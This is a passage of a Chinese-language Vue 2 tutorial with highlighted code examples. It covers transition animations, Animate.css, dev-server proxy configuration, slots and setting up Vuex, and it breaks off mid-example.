start="3"><li><p>写法：</p><ol><li>准备好样式：</li></ol><ul><li>元素进入的样式：<ol><li>v-enter：进入的起点</li><li>v-enter-active：进入过程中</li><li>v-enter-to：进入的终点</li></ol></li><li>元素离开的样式：<ol><li>v-leave：离开的起点</li><li>v-leave-active：离开过程中</li><li>v-leave-to：离开的终点</li></ol></li></ul><ol start="2"><li>使用<code>&lt;transition&gt;</code>包裹要过渡的元素，并配置name属性：</li><li>要让页面一开始就显示动画，需要添加appear</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">transition</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">appear</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;isShow&quot;</span>&gt;</span>你好啊！<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">transition</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.hello-enter-active</span>&#123;</span><br><span class="language-css">    <span class="hljs-attribute">animation</span>: hello <span class="hljs-number">0.5s</span> linear;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.hello-leave-active</span>&#123;</span><br><span class="language-css">    <span class="hljs-attribute">animation</span>: hello <span class="hljs-number">0.5s</span> linear reverse;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><br><span class="language-css">  <span class="hljs-keyword">@keyframes</span> hello &#123;</span><br><span class="language-css">    <span class="hljs-selector-tag">from</span>&#123;</span><br><span class="language-css">      <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">100%</span>);</span><br><span class="language-css">    &#125;</span><br><span class="language-css">    <span class="hljs-selector-tag">to</span>&#123;</span><br><span class="language-css">      <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-number">0px</span>);</span><br><span class="language-css">    &#125;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure>   </transition><ol start="4"><li><p>备注：若有多个元素需要过度，则需要使用：<code>&lt;transition-group&gt;</code>，且每个元素都要指定<code>key</code>值。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">transition-group</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">appear</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;!isShow&quot;</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span>你好啊！<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;isShow&quot;</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span>尚硅谷！<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">transition-group</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol></li></ol><p>​           </p><p>第三方动画库Animate.css</p><blockquote><p>使用第三库的具体案例（随便看看，这个不重要）<br>库的名称：Animate.css<br>安装：npm i animate.css<br>引入：import ‘animate.css’</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;isShow = !isShow&quot;</span>&gt;</span>显示/隐藏<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">transition-group</span> </span><br><span class="hljs-tag"><span class="hljs-attr">appear</span></span><br><span class="hljs-tag"><span class="hljs-attr">name</span>=<span class="hljs-string">&quot;animate__animated animate__bounce&quot;</span> </span><br><span class="hljs-tag"><span class="hljs-attr">enter-active-class</span>=<span class="hljs-string">&quot;animate__swing&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">leave-active-class</span>=<span class="hljs-string">&quot;animate__backOutUp&quot;</span></span><br><span class="hljs-tag">&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;!isShow&quot;</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span>你好啊！<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;isShow&quot;</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span>尚硅谷！<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">transition-group</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;animate.css&#x27;</span></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;Test&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">isShow</span>:<span class="hljs-literal">true</span></span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-tag">h1</span>&#123;</span><br><span class="language-css"><span class="hljs-attribute">background-color</span>: orange;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="2-9-vue脚手架配置代理"><a href="#2-9-vue脚手架配置代理" class="headerlink" title="2.9 vue脚手架配置代理"></a>2.9 vue脚手架配置代理</h2><p>可以用来解决跨域的问题  </p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124155041846.png" alt="image-20221124155041846"></p><blockquote><p>ajax 是前端技术，你得有浏览器，才有window对象，才有xhr，才能发ajax请求，服务器之间通信就用传统的http请求就行了。</p></blockquote><p>本案例需要下载axios库npm install axios<br>配置参考文档 Vue-Cli devServer.proxy<br>vue.config.js 是一个可选的配置文件，如果项目的 (和 package.json 同级的) 根目录中存在这个文件，那么它会被 @vue&#x2F;cli-service 自动加载。你也可以使用 package.json 中的 vue 字段，但是注意这种写法需要你严格遵照 JSON 的格式来写</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p> 在vue.config.js中添加如下配置：</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">devServer</span>:&#123;<br>    <span class="hljs-attr">proxy</span>:<span class="hljs-string">&quot;http://localhost:5000&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>说明：</p><pre><code class="hljs">1. 优点：配置简单，请求资源时直接发给前端（8080）即可。2. 缺点：不能配置多个代理，不能灵活的控制请求是否走代理。3. 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）</code></pre><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p> 编写vue.config.js配置具体代理规则：</p>   <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br><span class="hljs-attr">devServer</span>: &#123;<br>      <span class="hljs-attr">proxy</span>: &#123;<br>      <span class="hljs-string">&#x27;/api1&#x27;</span>: &#123;<span class="hljs-comment">// 匹配所有以 &#x27;/api1&#x27;开头的请求路径</span><br>        <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;http://localhost:5000&#x27;</span>,<span class="hljs-comment">// 代理目标的基础路径</span><br>        <span class="hljs-attr">pathRewrite</span>: &#123;<span class="hljs-string">&#x27;^/api1&#x27;</span>:<span class="hljs-string">&#x27;&#x27;</span>&#125;,<span class="hljs-comment">// 代理往后端服务器的请求去掉 /api1 前缀</span><br>        <span class="hljs-attr">ws</span>: <span class="hljs-literal">true</span>,<span class="hljs-comment">// WebSocket</span><br>        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,<br>        <br>      &#125;,<br>      <span class="hljs-string">&#x27;/api2&#x27;</span>: &#123;<br>        <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;http://localhost:5001&#x27;</span>,<br>        <span class="hljs-attr">pathRewrite</span>: &#123;<span class="hljs-string">&#x27;^/api2&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;,<br>        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span><br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000</span><br><span class="hljs-comment">   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080</span><br><span class="hljs-comment">   changeOrigin默认值为true</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>说明：</p><pre><code class="hljs">1. 优点：可以配置多个代理，且可以灵活的控制请求是否走代理。2. 缺点：配置略微繁琐，请求资源时必须加前缀。</code></pre><p>vue.config.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">pages</span>: &#123;<br>        <span class="hljs-attr">index</span>: &#123;<br>            <span class="hljs-attr">entry</span>: <span class="hljs-string">&#x27;src/main.js&#x27;</span>,<br>        &#125;,<br>    &#125;,<br>    <span class="hljs-attr">lintOnSave</span>:<span class="hljs-literal">false</span>,<br>    <span class="hljs-comment">// 开启代理服务器（方式一）</span><br>    <span class="hljs-comment">// devServer: &#123;</span><br>    <span class="hljs-comment">//     proxy:&#x27;http://localhost:5000&#x27;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">//开启代理服务器（方式二）</span><br><span class="hljs-attr">devServer</span>: &#123;<br>        <span class="hljs-attr">proxy</span>: &#123;<br>            <span class="hljs-string">&#x27;/api1&#x27;</span>: &#123;<br>                <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;http://localhost:5000&#x27;</span>,<br>                <span class="hljs-attr">pathRewrite</span>:&#123;<span class="hljs-string">&#x27;^/api1&#x27;</span>:<span class="hljs-string">&#x27;&#x27;</span>&#125;,<br>                <span class="hljs-comment">// ws: true, //用于支持websocket,默认值为true</span><br>                <span class="hljs-comment">// changeOrigin: true //用于控制请求头中的host值,默认值为true</span><br>            &#125;,<br>            <span class="hljs-string">&#x27;/api2&#x27;</span>: &#123;<br>                <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;http://localhost:5001&#x27;</span>,<br>                <span class="hljs-attr">pathRewrite</span>:&#123;<span class="hljs-string">&#x27;^/api2&#x27;</span>:<span class="hljs-string">&#x27;&#x27;</span>&#125;,<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-10-slot插槽"><a href="#2-10-slot插槽" class="headerlink" title="2.10 slot插槽"></a>2.10 slot插槽</h2><ol><li><p>作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong>父组件 &#x3D;&#x3D;&#x3D;&gt; 子组件</strong> 。</p></li><li><p>分类：默认插槽、具名插槽、作用域插槽</p></li><li><p>使用方式：</p><ol><li><p>默认插槽：</p><pre><code class="hljs">父组件中：        &lt;Category&gt;           &lt;div&gt;html结构1&lt;/div&gt;        &lt;/Category&gt;</code></pre><p>子组件中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>       <span class="hljs-comment">&lt;!-- 定义插槽 --&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">slot</span>&gt;</span>插槽默认内容...<span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​    </p></li><li><p>具名插槽：</p><p>父组件指明放入子组件的哪个插槽<strong>slot&#x3D;”footer”<strong>，如果是template可以写成</strong>v-slot:footer</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html">父组件中：<br>        <span class="hljs-tag">&lt;<span class="hljs-name">Category</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">slot</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>html结构1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br>            <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-slot:footer</span>&gt;</span><br>               <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>html结构2<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">Category</span>&gt;</span><br>子组件中：<br>        <span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>               <span class="hljs-comment">&lt;!-- 定义插槽 --&gt;</span><br>               <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span>插槽默认内容...<span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span><br>               <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;footer&quot;</span>&gt;</span>插槽默认内容...<span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br></code></pre></td></tr></table></figure></li><li><p>作用域插槽：</p><ol><li><p>理解：数据在组件的自身（子组件），但根据数据生成的结构需要组件的使用者（父组件）来决定。（games数据在Category（子）组件中，但使用数据所遍历出来的结构由App（父）组件决定）</p></li><li><p>具体编码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs html">父组件中：<br><span class="hljs-tag">&lt;<span class="hljs-name">Category</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">&quot;scopeData&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 生成的是ul列表 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;g in scopeData.games&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;g&quot;</span>&gt;</span>&#123;&#123;g&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Category</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">Category</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">slot-scope</span>=<span class="hljs-string">&quot;scopeData&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 生成的是h4标题 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h4</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;g in scopeData.games&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;g&quot;</span>&gt;</span>&#123;&#123;g&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Category</span>&gt;</span><br>子组件中：<br>        <span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-comment">&lt;!-- 通过数据绑定就可以把子组件的数据传到父组件 --&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">:games</span>=<span class="hljs-string">&quot;games&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">            <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;Category&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">props</span>:[<span class="hljs-string">&#x27;title&#x27;</span>],</span><br><span class="language-javascript">                <span class="hljs-comment">//数据在子组件自身</span></span><br><span class="language-javascript">                <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                        <span class="hljs-attr">games</span>:[<span class="hljs-string">&#x27;红色警戒&#x27;</span>,<span class="hljs-string">&#x27;穿越火线&#x27;</span>,<span class="hljs-string">&#x27;劲舞团&#x27;</span>,<span class="hljs-string">&#x27;超级玛丽&#x27;</span>]</span><br><span class="language-javascript">                    &#125;</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure></li></ol></li></ol></li></ol><h1 id="3-VUEX"><a href="#3-VUEX" class="headerlink" title="3. VUEX"></a>3. VUEX</h1><p>原理图：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124155349526.png" alt="image-20221124155349526"></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124155424516.png"></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124155500975.png" alt="image-20221124155500975"></p><h2 id="3-1-概念"><a href="#3-1-概念" class="headerlink" title="3.1 概念"></a>3.1 概念</h2><p>在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读&#x2F;写），也是一种组件间通信的方式，且适用于任意组件间通信。</p><p><a href="https://github.com/vuejs/vuex">Vuex Github地址</a></p><h2 id="3-2-何时使用？"><a href="#3-2-何时使用？" class="headerlink" title="3.2 何时使用？"></a>3.2 何时使用？</h2><ol><li><p>多个组件需要共享数据时</p></li><li><p>多个组件依赖于同一状态</p></li><li><p>来自不同组件的行为需要变更同一状态</p></li></ol><h2 id="3-3-搭建vuex环境"><a href="#3-3-搭建vuex环境" class="headerlink" title="3.3 搭建vuex环境"></a>3.3 搭建vuex环境</h2><ol><li><p>下载安装vuex <code>npm i vuex</code></p><p>Vue对默认版本进行了更新，现在默认使用Vue3 。npm i vuex 默认下载vuex4，Vue2无法使用，自能使用vuex3。使用Vue2使用 <code>npm i vuex@3</code> 下载</p></li><li><p>创建<code>src/store/index.js</code>该文件用于创建Vuex中最为核心的<strong>store</strong></p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-comment">//引入Vuex</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vuex</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vuex&#x27;</span><br><span class="hljs-comment">//应用Vuex插件</span><br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">Vuex</span>)<br><br><span class="hljs-comment">//准备actions对象——响应组件中用户的动作</span><br><span class="hljs-keyword">const</span> actions = &#123;&#125;<br><span class="hljs-comment">//准备mutations对象——修改state中的数据</span><br><span class="hljs-keyword">const</span> mutations = &#123;&#125;<br><span class="hljs-comment">//准备state对象——保存具体的数据</span><br><span class="hljs-keyword">const</span> state = &#123;&#125;<br><br><span class="hljs-comment">//创建并暴露store</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuex</span>.<span class="hljs-title class_">Store</span>(&#123;<br>actions,<br>mutations,<br>state<br>&#125;)<br></code></pre></td></tr></table></figure><ol start="2"><li>在<code>main.js</code>中创建vm时传入<code>store</code>配置项</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span><br><span class="hljs-keyword">import</span> store <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./store&#x27;</span><span class="hljs-comment">// 引入store</span><br><br><span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span><br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br><span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#app&#x27;</span>,<br><span class="hljs-attr">render</span>: <span class="hljs-function"><span class="hljs-params">h</span> =&gt;</span> <span class="hljs-title function_">h</span>(<span class="hljs-title class_">App</span>),<br>store,<span class="hljs-comment">// 配置项添加store</span><br><span class="hljs-title function_">beforeCreate</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-title class_">Vue</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">$bus</span> = <span class="hljs-variable language_">this</span><br>&#125;<br>&#125;)<br></code></pre></td></tr></table></figure><h2 id="3-4-基本使用"><a href="#3-4-基本使用" class="headerlink" title="3.4 基本使用"></a>3.4 基本使用</h2><ol><li>初始化数据、配置<code>actions</code>、配置<code>mutations</code>，操作文件<code>store.js</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 